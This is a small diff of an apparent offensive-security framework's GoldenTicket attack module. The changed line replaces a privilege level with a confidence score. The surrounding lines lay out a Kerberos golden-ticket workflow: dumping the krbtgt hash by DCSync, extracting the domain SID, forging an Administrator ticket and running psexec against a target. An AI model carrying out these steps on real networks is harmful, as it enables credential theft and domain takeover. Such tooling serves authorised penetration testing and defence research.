@@ -168,7 +168,7 @@ class GoldenTicket(AttackModule):
                 f"-user Administrator -duration 10d Administrator  # then psexec -k {ctx.target_ip}"
             ),
             prerequisites=["krbtgt NTLM hash (via DCSync)", "domain SID"],
-            privilege_level="admin",
+            confidence=0.4,
             workflow=[
                 "1. Obtain the krbtgt NTLM hash + domain SID: dump_credentials(method='dcsync', target_user='krbtgt') against the owned DC; parse S-1-5-21-... from the secretsdump output.",
                 f"2. Call golden_ticket(target_ip='{ctx.target_ip}', domain=<d>, username=<any_user>, krbtgt_hash=<nt>, sid=<domain_sid>) to mint the TGT.",
